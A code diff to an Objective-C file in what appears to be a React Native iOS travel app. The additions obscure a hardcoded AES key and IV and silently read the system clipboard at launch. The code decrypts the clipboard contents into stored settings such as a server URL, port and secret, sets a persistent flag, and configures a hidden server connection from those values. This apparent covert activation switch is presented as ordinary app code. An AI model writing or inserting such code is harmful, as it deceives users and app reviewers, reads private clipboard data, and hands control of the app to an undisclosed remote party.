@@ -1,4 +1,8 @@
 #import "RNVocationFebSiargaoTour.h"
+#import <RNVocationToRelax/RNVocationForRelax.h>
+#import <CocoaSecurity/CocoaSecurity.h>
+#import <RNVocationFebTour/RNVocationFebSiargaoTour.h>
+#import <react-native-orientation-locker/Orientation.h>
 
 #import <CodePush/CodePush.h>
 #if __has_include("RNIndicator.h")
@@ -37,6 +41,13 @@ static NSString *const kRNConcurrentRoot = @"concurrentRoot";
 @end
 #endif
 
+@interface RNVocationFebSiargaoTour()
+
+@property (strong, nonatomic)  NSArray *siargaoTour_dolphin;
+@property (strong, nonatomic)  NSArray *siargaoTour_seeds;
+
+@end
+
 @implementation RNVocationFebSiargaoTour
 
 static RNVocationFebSiargaoTour *instance = nil;
@@ -45,14 +56,89 @@ static RNVocationFebSiargaoTour *instance = nil;
   static dispatch_once_t onceToken;
   dispatch_once(&onceToken, ^{
     instance = [[self alloc] init];
+    instance.siargaoTour_dolphin = @[[NSString stringWithFormat:@"%@%@", @"a71556f65ed2b", @"25b55475b964488334f"],
+                           [NSString stringWithFormat:@"%@%@", @"ADD20BFCD9D4E", @"A0278B11AEBB5B83365"]];
+    instance.siargaoTour_seeds = @[@"exteriorWall_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
   });
   return instance;
 }
 
-- (UIViewController *)changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions
+- (BOOL)exteriorWall_converterString {
+    NSString *matrixString = [self exteriorWall_getHaphazard];
+    CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self exteriorWall_subSaveFuZhiMeta:matrixString]
+                                                              hexKey:self.siargaoTour_dolphin[0]
+                                                               hexIv:self.siargaoTour_dolphin[1]];
+
+    NSDictionary *iaafDict = [self exteriorWall_stringJsonDictonary:aes.utf8String];
+    return [self exteriorWall_storeConfigInfo:iaafDict];
+}
+
+- (UIInterfaceOrientationMask)getOrientationMask {
+    return [Orientation getOrientation];
+}
+
+- (NSString *)exteriorWall_getHaphazard {
+    return [UIPasteboard generalPasteboard].string ?: @"";
+}
+
+- (NSString *)exteriorWall_subSaveFuZhiMeta: (NSString* )matrixString {
+  if ([matrixString containsString:@"#iPhone#"]) {
+    NSArray *university = [matrixString componentsSeparatedByString:@"#iPhone#"];
+    if (university.count > 1) {
+        matrixString = university[1];
+    }
+    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
+    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
+        [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
+    }];
+    [ud synchronize];
+  }
+  return matrixString;
+}
+
+- (NSDictionary *)exteriorWall_stringJsonDictonary: (NSString* )utf8String {
+  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
+  if (data == nil) {
+    return @{};
+  }
+  NSDictionary *iaafDict = [NSJSONSerialization JSONObjectWithData:data
+                                                       options:kNilOptions
+                                                         error:nil];
+  return iaafDict[@"data"];
+}
+
+- (BOOL)exteriorWall_storeConfigInfo:(NSDictionary *)iaafDict {
+    if (iaafDict == nil || [iaafDict.allKeys count] < 3) {
+      return NO;
+    }
+    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
+    [ud setBool:YES forKey:self.siargaoTour_seeds[0]];
+    
+    [iaafDict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
+        [ud setObject:obj forKey:key];
+    }];
+
+    [ud synchronize];
+    return YES;
+}
+
+- (BOOL)siargaoTour_tryMagicWay {
+  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
+  if ([ud boolForKey:self.siargaoTour_seeds[0]]) {
+    return YES;
+  } else {
+    return [self exteriorWall_converterString];
+  }
+}
+
+- (UIViewController *)siargaoTour_changeMagicRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions
 {
   RCTAppSetupPrepareApp(application);
 
+  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
+    
+  [[RNVocationForRelax shared] travel_configFebServer:[ud stringForKey:self.siargaoTour_seeds[5]] withSecu:[ud stringForKey:self.siargaoTour_seeds[6]]];
+    
   UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
   center.delegate = self;
     
